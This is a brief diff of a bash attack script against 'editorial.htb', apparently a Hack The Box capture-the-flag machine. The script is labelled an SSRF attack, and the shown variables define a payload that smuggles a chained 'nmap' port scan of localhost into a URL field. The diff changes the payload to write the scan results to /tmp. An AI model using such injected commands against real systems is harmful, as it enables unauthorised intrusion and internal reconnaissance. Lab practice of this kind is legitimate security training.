@@ -2,8 +2,8 @@
 
 # Variables
 url="http://editorial.htb/upload-cover"
-result_url="http://editorial.htb/results"
-payload="http://127.0.0.1; nmap -p 1-6000 -sV 127.0.0.1"
+result_url="http://editorial.htb/tmp/nmap_results.txt"
+payload="http://127.0.0.1; nmap -p 1-6000 -sV 127.0.0.1 > /tmp/nmap_results.txt"
 
 # Function to perform the SSRF attack
 perform_ssrf_attack() {
